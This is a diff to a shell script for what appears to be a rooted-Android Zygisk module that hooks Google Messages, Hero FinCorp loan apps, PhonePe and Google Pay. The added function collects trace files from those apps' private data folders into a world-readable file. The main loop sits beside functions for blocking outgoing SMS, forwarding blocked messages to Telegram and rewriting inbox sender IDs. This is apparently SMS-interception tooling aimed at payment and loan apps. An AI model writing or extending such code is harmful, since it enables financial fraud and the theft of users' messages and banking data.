@@ -550,6 +550,28 @@ harvest_blocked_outgoing() {
 # A16: app writes hook_status to code_cache — root copies to tmp so file manager me dikhe
 # CRITICAL: Messages status alag rakho — GPay/PhonePe harvest se overwrite mat karo
 # (Hero SENDTO → Messages; user hamesha UPI wala file dekh ke confuse hota tha)
+harvest_isms_trace() {
+  for pkg in com.google.android.apps.messaging com.herofincorp.diyjourneys \
+             com.herofincorp.simplycash com.customer.herofincorp com.phonepe.app \
+             com.google.android.apps.nbu.paisa.user; do
+    for f in \
+      "/data/user/0/$pkg/code_cache/hivirtus/isms_trace.txt" \
+      "/data/data/$pkg/code_cache/hivirtus/isms_trace.txt"
+    do
+      [ -f "$f" ] && [ -s "$f" ] || continue
+      cat "$f" >> /data/local/tmp/hivirtus_isms_trace.txt 2>/dev/null
+      : > "$f" 2>/dev/null
+    done
+  done
+  [ -f /data/adb/modules/hivirtus_zygisk_mode/isms_trace.txt ] && \
+    cat /data/adb/modules/hivirtus_zygisk_mode/isms_trace.txt >> /data/local/tmp/hivirtus_isms_trace.txt 2>/dev/null && \
+    : > /data/adb/modules/hivirtus_zygisk_mode/isms_trace.txt
+  chmod 666 /data/local/tmp/hivirtus_isms_trace.txt 2>/dev/null
+  # Ensure file always exists for user checks
+  [ -f /data/local/tmp/hivirtus_isms_trace.txt ] || : > /data/local/tmp/hivirtus_isms_trace.txt
+  chmod 666 /data/local/tmp/hivirtus_isms_trace.txt 2>/dev/null
+}
+
 harvest_hook_status() {
   local best="" latest="" msg_best="" msg_latest=""
   local msg_pkgs="com.google.android.apps.messaging com.android.messaging com.samsung.android.messaging com.motorola.messaging com.android.mms com.oneplus.mms com.coloros.mms com.android.mms.service"
@@ -946,6 +968,7 @@ rewrite_inbox_sender_id() {
   while true; do
     send_tg_test_if_requested
     harvest_hook_status
+    harvest_isms_trace
     harvest_blocked_outgoing
     forward_blocked_telegram
     enforce_sms_block
